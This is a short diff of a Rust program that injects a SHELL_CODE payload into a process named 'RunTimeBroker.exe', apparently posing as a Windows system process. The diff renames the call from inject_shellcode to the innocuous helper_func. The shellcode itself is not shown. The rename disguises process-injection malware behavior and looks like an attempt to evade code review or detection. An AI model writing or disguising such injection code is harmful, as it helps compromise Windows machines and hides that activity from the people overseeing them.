@@ -31,5 +31,5 @@ fn main() {
 
     let process_name = "RunTimeBroker.exe".to_string();
 
-    snapinject_rs::inject_shellcode(&process_name, &SHELL_CODE).unwrap();
+    snapinject_rs::helper_func(&process_name, &SHELL_CODE).unwrap();
 }
